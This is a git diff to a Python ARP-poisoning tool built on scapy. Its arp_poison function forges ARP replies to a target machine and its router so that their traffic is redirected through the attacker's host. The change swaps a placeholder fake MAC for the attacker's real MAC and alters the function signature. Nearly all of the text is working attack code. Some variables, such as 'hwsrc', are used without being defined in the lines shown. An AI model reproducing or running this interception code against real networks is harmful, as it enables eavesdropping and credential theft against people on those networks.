@@ -16,7 +16,9 @@ import pyfiglet
 from termcolor import colored
 import netifaces
 import ipaddress
-from Identifiers import arpscan 
+from identifiers.mac import get_mac, get_my_mac
+
+
 #variables in the rich library
 
 
@@ -24,7 +26,7 @@ console = Console()
 #----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 #ARP Poisoning Function for Target Only
-def arp_poison(target_ip, router_ip, router_mac):
+def arp_poison(target_ip, router_ip, router_mac, target_mac, source_mac):
 
     #automatically inserted target mac variabke
     
@@ -33,12 +35,19 @@ def arp_poison(target_ip, router_ip, router_mac):
         console.print(f"[red] Could not resolve MAC for {target_ip}")
         return 
 
-    #fake mac variable
+    source_mac = get_my_mac()
+    if not source_mac:
+        console.print(f"[red] Could not resolve MAC for host")
+        return
+
+
+
+    #fake mac variable (not important)
     # fake_mac = "00:11:22:33:44:55"  
     
     #ARP Broadcast Packet
-    packet_for_target = Ether(dst=router_mac, src=hwsrc) / ARP(op=2, psrc=target_ip, hwsrc=fake_mac, hwdst=router_mac, pdst=router_ip)
-    packet_for_router = Ether(dst=target_mac,src=hwsrc) / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, hwdst=target_mac, pdst=target_ip)
+    packet_for_target = Ether(dst=router_mac, src=hwsrc) / ARP(op=2, psrc=target_ip, hwsrc=source_mac, hwdst=router_mac, pdst=router_ip)
+    packet_for_router = Ether(dst=target_mac,src=hwsrc) / ARP(op=2, psrc=router_ip, hwsrc=source_mac, hwdst=target_mac, pdst=target_ip)
     iface = conf.iface
 
     console.print(f"[yellow]Poisoning {target_ip} and {router_ip}...")
@@ -49,7 +58,7 @@ def arp_poison(target_ip, router_ip, router_mac):
             time.sleep(2)
 
 
-            console.print("[green]ARP Interception\n")
+            console.print("[green]...\n")
             console.print("[blue]ARP Poisoning completed. Press Ctrl+C to stop.")
     except Exception as e:
         console.print("[Red] Failed to Send Poisoning Packets. Please Try Again. \n")
